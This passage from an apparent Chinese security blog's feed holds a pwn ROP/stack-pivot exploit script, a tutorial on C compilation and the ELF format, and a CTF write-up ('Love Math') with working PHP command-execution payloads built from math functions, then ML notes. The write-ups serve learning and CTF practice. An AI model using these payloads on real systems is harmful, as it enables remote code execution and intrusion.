class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your message will be saved at 0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),base = <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ad3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400a18</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload = payload + p64(<span class="number">0</span>)</span><br><span class="line">payload = payload + p64(pop_rdi_ret)</span><br><span class="line">payload = payload + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(<span class="number">0x4008f6</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload = payload + p64(stack)</span><br><span class="line">payload = payload + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">leak_libc(leak)</span><br><span class="line">og = libc_base + <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(<span class="number">0xd8</span> * <span class="string">b&#x27;\x00&#x27;</span> + p64(og))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="分析回顾栈迁移"><a href="#分析回顾栈迁移" class="headerlink" title="分析回顾栈迁移"></a>分析回顾栈迁移</h2><p>没有开PIE保护和Canary</p><ul><li>IDA分析结果如下<br><img src="https://i.loli.net/2021/03/12/zGy2nY6fm3SCPN5.png" /></li></ul><p>题目给出栈地址，我们可以将栈迁移到栈上，布置gadget泄漏libc地址然后one_gadget一把梭</p><ul><li>栈帧结构如下<br><img src="https://i.loli.net/2021/03/12/FjcnmS6bw1JlXxa.png" /></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制程序从源文件到可执行程序的过程</title>
      <link href="2021/03/09/binary-programming/"/>
      <url>2021/03/09/binary-programming/</url>
      
        <content type="html"><![CDATA[<p>在c语言中，我们都知道一个源程序从源码到可执行文件都要经历预处理，编译，汇编和链接的过程，最终形成可执行文件，然后才被操作系统装载进内存运行。</p><p>为了复习pwn知识，写个文章来探究一下经常被我忽略的关于程序的中间过程。</p><h2 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h2><p>该过程主要处理源代码中以’#’开始的预编译指令<br>具体处理规则如下：</p><ul><li>删除#define并展开所有的宏定义</li><li>处理所有条件预编译指令：如 “#if”等</li><li>处理”#include”预编译指令，将被包含的文件插入到该预编译指令的位置</li><li>删除注释，添加行号和文件名标识</li></ul><p>预编译的过程可用如下指令来执行 </p><p><code>gcc -E BinaryName.c -o BinaryName.i</code></p><p>源代码如下：<br><img src="https://i.loli.net/2021/03/09/AMG6ofRz71mCxev.png" style="zoom:50%;"/></p><p>经过预编译后：<br><img src="https://i.loli.net/2021/03/09/oQRzCvZfhs38HTy.png" style="zoom:50%;"/></p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译过程经过一系列词法分析等步骤生成汇编代码文件，是程序构建的核心部分<br>不同的操作系统有不同的编译器，比如Linux下的gcc，g++，Windows下的MSVCCL等（后文都以Linux平台下来探究）<br>我们可以使用<code>gcc -S BinaryName.i -o BinaryName.s</code>或者<code>gcc -S BinaryName -o BinaryName.s</code>来查看经过编译后的文件</p><p><img src="https://i.loli.net/2021/03/09/bps3QmPGn5ScZJr.png" style="zoom:50%;"/></p><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>汇编过程可以将汇编代码转变为机器可以执行的指令<br><code>gcc -c BinaryName.s -o BinaryName.o</code>或<br><code>gcc -c BinaryName.c -o BinaryName.o</code></p><h2 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h2><p>我们先看下c语言源代码中的变量和函数</p><h3 id="c语言源代码中的变量和函数"><a href="#c语言源代码中的变量和函数" class="headerlink" title="c语言源代码中的变量和函数"></a>c语言源代码中的变量和函数</h3><ul><li>声明和定义的区别：<ul><li>声明是告诉编译器该变量没有在当前文件中定义而是在其他文件中定义</li><li>定义变量是告诉编译器在生成的目标文件中留出空间来存放该变量</li><li>定义函数是告诉编译器在目标文件中生成该函数的二进制代码</li></ul></li></ul><p>变量类型如下：</p><ol><li>全局变量：非static，表示该变量的生命周期是整个程序的执行期间，可以被其他文件访问</li><li>全局变量：static，生命周期也是整个程序的执行期间，但是不能被其他文件访问</li><li>局部变量：static，生命周期是程序的执行期间，但是作用域仅在该函数体中</li><li>局部变量：非static，仅存在于当前当前函数体中</li></ol><p>对于函数也同理，如果定义了static则无法被其他文件所读取</p><h3 id="目标文件的格式"><a href="#目标文件的格式" class="headerlink" title="目标文件的格式"></a>目标文件的格式</h3><p>部分段名如下</p><ul><li>.data段保存已经初始化的全局静态变量和局部静态变量</li><li>.rodata段存放的是只读数据，一般是程序里面的只读变量（const修饰的）和字符串常量</li><li>.bss段存放的是未初始化的全局变量和局部静态变量</li><li>.comment存放的是编译器版本信息</li><li>.debug存放调试信息</li><li>.dynamic存放动态链接信息</li><li>.strtab String Table字符串表，用于存放ELF文件中用到的各种字符串</li><li>.symtab Symbol Table符号表</li><li>.plt .got 动态链接的跳转表和全局入口表</li><li>.init 程序初始化段</li><li>.fini 程序终结代码段</li></ul><p>ELF文件头结构体如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf64_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf64_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf64_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf64_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf64_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf64_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf64_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf64_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf64_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf64_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf64_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure><p>ELF header结构体如下<br><img src="https://i.loli.net/2021/03/09/VwWutzkDLN934Zy.png" style="zoom:50%;" /></p><h3 id="源代码到目标文件的处理"><a href="#源代码到目标文件的处理" class="headerlink" title="源代码到目标文件的处理"></a>源代码到目标文件的处理</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> globalA = <span class="number">2333</span>;</span><br><span class="line"><span class="keyword">int</span> globalB;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalC = <span class="number">666</span>;  <span class="comment">// 全局static</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> globalE; <span class="comment">// 声明全局变量</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">Print</span><span class="params">()</span></span>; <span class="comment">// 声明函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> b;</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line">test(<span class="number">12</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过nm命令来查看目标文件的符号，从左到右分别是变量的相对地址，变量所在段的名字和变量名字。<br><img src="https://i.loli.net/2021/03/09/15H7DNjxQdUslnV.png" style="zoom:50%;" ></p><p>其中a.1922是编译器修改变量名字的结果，因为a是一个局部静态变量，作用域在他的函数体中，所以当我们在不同的函数体中声明相同名字的局部静态变量（这种操作是被允许的）而且其生命周期为整个程序执行时，编译器为了支持这种功能，所以来加后缀来标识不同的局部静态变量。</p><p>我们还可以用objdump来查看目标文件的结构，-h参数可查看各个段的基本信息</p><p><img src="https://i.loli.net/2021/03/09/5GTWh29juR6pxUZ.png" style="zoom:50%;" /></p><p>Size表示段长度<br>File off表示在文件中的偏移<br>每个段第二行中的”CONTENTS” “ALLOC”等表示段的属性，”CONTENTS”表示在文件中存在<br>比如数据段的大小为0xc字节大小，因为有三个四字节的变量分别为globalA,globalC和a</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>使用如下命令来完成链接过程<br><code>gcc Binary.o -o BinaryName</code></p><p><img src="https://i.loli.net/2021/03/09/4MySVpGcZOiLqQr.png" style="zoom:50%;" /></p><p>可以看到之前的一些相对地址全部变为了绝对地址，完成了地址重定位</p><h2 id="装载运行"><a href="#装载运行" class="headerlink" title="装载运行"></a>装载运行</h2><p>当程序加载进内存程序即可运行，在这个过程中我们不得不提到虚拟内存，动态链接库和函数执行的问题。我们给出程序执行的顺序，具体探究我们等到之后的文章再另行分析。</p><blockquote><p>  1.首先 bash 进行 fork 系统调用，生成一个子进程，接着在子进程中运行 execve 函数指定的 elf 二进制程序（ Linux中执行二进制程序最终都是通过 execve 这个库函数进行的），execve 会调用系统调用把 elf 文件 load 到内存中的代码段(_text)中。<br>2.如果有依赖的动态链接库，会调用动态链接器进行库文件的地址映射，动态链接库的内存空间是被多个进程共享的。<br>3.内核从 elf 文件头得到_start的地址，调度执行流从_start指向的地址开始执行，执行流在_start执行的代码段中跳转到libc中的公共初始化代码段<strong>libc_start_main，进行程序运行前的初始化工作。<br>4.</strong>libc_start_main的执行过程中，会跳转到_init中全局变量的初始化工作，随后调用我们的main函数，进入到主函数的指令流程。</p></blockquote><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>《程序员的自我修养》</li><li><a href="https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/">https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/</a></li><li><a href="https://tech.meituan.com/2015/01/22/linker.html">https://tech.meituan.com/2015/01/22/linker.html</a></li><li><a href="https://code.woboq.org/">https://code.woboq.org/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制 </tag>
            
            <tag> 程序与操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf:[CISCN 2019 初赛] Love Math-总结数学中的命令执行</title>
      <link href="2021/03/06/web1-love-math/"/>
      <url>2021/03/06/web1-love-math/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>开局给了源码 拿到本地分析一下<br><img src="https://i.loli.net/2021/03/06/oLhWucimrZ1tPB2.png" alt="1.png"></li></ul><p><img src="https://i.loli.net/2021/03/06/JiyeCSQMwdnHIXq.png" alt="2.png"></p><p><img src="https://i.loli.net/2021/03/06/V1DGCytmnK2Yai9.png" alt="3.png"></p><p>白名单只给了一堆数学函数<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br></pre></td></tr></table></figure></p><p>从里面找出来能够利用的拼凑出命令执行</p><p>最终肯定希望能够达成这样的结果<code>eval(&#39;echo&#39; . &#39;$_POST[1]&#39; . &#39;;&#39;)</code><br>所以难点在于如何利用已知函数来拼凑出$_POST</p><h3 id="几个函数"><a href="#几个函数" class="headerlink" title="几个函数"></a>几个函数</h3><ol><li>hex2bin — 转换十六进制字符串为二进制字符串</li><li>base_convert — 在任意进制之间转换数字，最高为36进制</li><li>dechex — 十进制转换为十六进制</li></ol><p>利用base_convert凑出来hex2bin,再利用hex2bin凑出来_POST,最后用可变变量完成命令执行</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">409369269076</span>));<span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>); <span class="comment">// base_convert(37907361743,10,36) = hex2bin</span></span><br><span class="line">dechex(<span class="number">409369269076</span>); <span class="comment">// 转成_POST字符串的十六进制</span></span><br><span class="line"></span><br><span class="line">以上两个语句合起来为 <span class="variable">$pi</span> = hex2bin(<span class="string">&#x27;5f504f5354&#x27;</span>) = _POST;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;) = <span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$_POST</span>&#123;<span class="number">2</span>&#125;); <span class="comment">// 中括号被ban,用大括号来绕过</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/oC6xULjHR1aP9kD.png" alt="4.png"></p><h2 id="其他payload"><a href="#其他payload" class="headerlink" title="其他payload"></a>其他payload</h2><h3 id="get传入参数命令执行"><a href="#get传入参数命令执行" class="headerlink" title="get传入参数命令执行"></a>get传入参数命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125;)&amp;pi=system&amp;sin=cat /flag</span><br><span class="line"></span><br><span class="line"><span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>)) = _GET;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125; = <span class="variable">$_GET</span>&#123;pi&#125;(<span class="variable">$_GET</span>&#123;sin&#125;); <span class="comment">// 通过get方法传入参数完成命令执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="headers传入参数命令执行"><a href="#headers传入参数命令执行" class="headerlink" title="headers传入参数命令执行"></a>headers传入参数命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = exec</span><br><span class="line">((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = ((base_convert(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = getallheaders()&#123;<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">即 exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>几点说明</p><p>getallheaders — 获取全部 HTTP 请求头信息</p><p><img src="https://i.loli.net/2021/03/06/CcBEwGWhjMp9AmO.png" alt="5.png"></p><p>当取数组元素时，用大括号会抛出警告而不是错误</p><p><img src="https://i.loli.net/2021/03/06/WtgMeZJO6rl25QV.png" alt="6.png"></p><p>用上述payload 加上 postman改下headers即可命令执行getflag</p><p><img src="https://i.loli.net/2021/03/06/4kdNB8AUj59IiHu.png" alt="9.png"></p><h3 id="字符串异或命令执行"><a href="#字符串异或命令执行" class="headerlink" title="字符串异或命令执行"></a>字符串异或命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$whitelist</span> <span class="keyword">as</span> <span class="variable">$white</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">999999</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decbin(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decbin:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decoct(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decoct:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ dechex(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;dechex:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> .  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/uGUmVAZe5BXbazM.png" alt="7.png"></p><p>发现俩能用的</p><p><code>payload:?c=$pi=dechex(481137)^hexdec;$$pi&#123;1&#125;($$pi&#123;2&#125;)</code></p><p><img src="https://i.loli.net/2021/03/06/y6aTOkVeDoFPcmC.png" alt="8.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a><br><a href="https://www.bilibili.com/video/BV1pE411f7DN?t=1567">https://www.bilibili.com/video/BV1pE411f7DN?t=1567</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> web </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Machine Learning</title>
      <link href="2021/03/05/ML/"/>
      <url>2021/03/05/ML/</url>
      
        <content type="html"><![CDATA[<h2 id="1-4-Unsupervised-Learning"><a href="#1-4-Unsupervised-Learning" class="headerlink" title="1-4.Unsupervised Learning"></a>1-4.Unsupervised Learning</h2><p>google news：聚类算法，无监督学习算法</p><p><img src="https://i.loli.net/2021/03/06/1TFOpXztKCkwcrW.png" alt="image-20210306085443145.png"></p><p>聚类算法是unsupervised learning的一种</p><p><img src="https://i.loli.net/2021/03/06/r5F1CvS3Zx9bGOk.png" alt=""></p><blockquote><p>B is a unsupervised learning problem.</p></blockquote><h2 id="2-1-模型描述"><a href="#2-1-模型描述" class="headerlink" title="2-1.模型描述"></a>2-1.模型描述</h2><p><img src="https://i.loli.net/2021/03/06/fF3lQLcRgkxP5iW.png" alt=""></p><p>根据拟合状况预估房价，是一个supervised learning problem，因为每一个大小都有一个“正确的答案”，并且还是回归问题。</p><p>Notation:</p><ul><li>m = Number of training examples</li><li>x = “input” variable / features</li><li><p>y = “output” variable / “target” variable</p></li><li><p>(x,y) = one traing example</p></li><li><p>$(x^{(i)},y^{(i)})$ = $i^{th}$   training example (not exponentiation,i means “index”)</p></li><li><p>h = hypothesis</p></li></ul><p><img src="https://i.loli.net/2021/03/06/2EMSJuBbaqKs6oI.png" alt=""><br>Linear regression with one variable.Univariate linear regression.(one variable)</p><h2 id="2-2代价函数-一"><a href="#2-2代价函数-一" class="headerlink" title="2.2代价函数(一)"></a>2.2代价函数(一)</h2><p><img src="https://i.loli.net/2021/03/06/U9H7TZXSpEtYdaj.png" alt=""></p><p>Cost function  </p><script type="math/tex; mode=display">J(\theta_0,\theta_1)=\frac 1{2m}\sum_{i=1}^m(h_{\theta}(x^{(i)}-y^{(i)})^2</script><h2 id="2-3代价函数-二"><a href="#2-3代价函数-二" class="headerlink" title="2.3代价函数(二)"></a>2.3代价函数(二)</h2><p><img src="https://i.loli.net/2021/03/06/jwi5Mp2K8b3CLPq.png" alt=""></p><p><img src="https://i.loli.net/2021/03/06/4sFmDZuqdGVTi7S.png" alt=""></p><p>简化代价函数使得$\theta_0 = 0$，理解代价函数</p><p>对于上图特殊的training set，可以找出$\theta_1 = 1$时，可以完美拟合</p><h2 